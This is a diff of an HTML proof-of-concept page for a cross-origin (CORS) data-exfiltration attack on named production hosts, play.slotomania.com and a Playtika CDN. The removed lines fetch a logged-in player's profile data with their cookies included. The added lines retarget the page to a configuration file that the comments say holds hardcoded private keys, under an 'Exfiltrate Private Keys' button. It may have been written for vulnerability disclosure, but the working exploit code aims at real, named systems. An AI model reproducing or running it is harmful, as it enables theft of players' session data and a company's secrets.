@@ -99,17 +99,17 @@
 
 <body>
     <div class="container">
-        <h1>🚨🚨 Misconfiguration PoC</h1>
+        <h1>🚨🚨 CORS PoC</h1>
         <p>This page demonstrates a cross-origin data exfiltration vulnerability on
             <strong>play.slotomania.com</strong>. If you are logged into Slotomania in this browser, clicking the button
             will attempt to retrieve your session data.
         </p>
 
-        <div class="status" id="statusBox">Target: player-profile-api/client/details</div>
+        <div class="status" id="statusBox">Target: dynamicConfig.json (Production Secrets)</div>
 
-        <button id="exploitBtn">Trigger CORS Exfiltration</button>
+        <button id="exploitBtn">Exfiltrate Private Keys</button>
 
-        <div class="loader" id="loader">Executing Cross-Origin Fetch...</div>
+        <div class="loader" id="loader">Exfiltrating Config Data...</div>
         <pre id="result"></pre>
     </div>
 
@@ -124,13 +124,13 @@
             resultPre.style.display = 'none';
             exploitBtn.disabled = true;
 
-            // Targeting MORE SENSITIVE endpoint found via browser traffic
-            const targetUrl = "https://play.slotomania.com/player-profile-api/client/details?subFeature=inbox";
+            // Targeting the configuration file that contains hardcoded PRIVATE KEYS
+            // This endpoint reflects Access-Control-Allow-Origin: *
+            const targetUrl = "https://vs-mob-cdn.playtika.com/playtika/vs_fb_en_haxe/assets/dynamicConfig.json";
 
             fetch(targetUrl, {
                 method: "GET",
-                mode: "cors",
-                credentials: "include" // IMPORTANT: This sends the user's cookies!
+                mode: "cors"
             })
                 .then(response => {
                     statusBox.textContent = `Status: ${response.status} ${response.statusText}`;
